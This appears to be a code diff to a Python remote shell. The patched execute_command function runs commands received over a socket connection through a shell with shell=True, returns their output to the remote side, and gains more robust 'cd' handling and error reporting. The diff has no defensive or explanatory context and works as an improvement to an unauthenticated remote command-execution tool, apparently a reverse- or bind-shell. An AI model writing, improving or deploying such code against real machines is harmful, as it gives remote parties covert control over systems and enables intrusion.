@@ -54,17 +54,25 @@ def socket_accept():
     conn.close()
     
 def execute_command(cmd, conn):
-    if cmd[:2].decode("utf-8") == "cd":
-        os.chdir(cmd[3:])
+    decoded = cmd.decode("utf-8", errors="ignore")
+    if decoded.startswith("cd "):
+        path = decoded[3:].strip()
+        try:
+            os.chdir(path)
+            # send a short, non-empty acknowledgement so client.recv() unblocks
+            conn.send(str.encode("\n"))
+        except Exception as e:
+            conn.send(str.encode(str(e)))
+        return
         
-    if len(cmd) > 0:
-        cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, 
-                            stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte, "utf-8")
-        conn.send(str.encode(output_str))
 
-    print(output_str)
+    if len(decoded) > 0:
+        proc = subprocess.Popen(decoded, shell=True,
+                                stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = proc.stdout.read() + proc.stderr.read()
+        output_str = output_byte.decode("utf-8", errors="ignore")
+        conn.send(str.encode(output_str))
+        print(output_str)
             
 
             
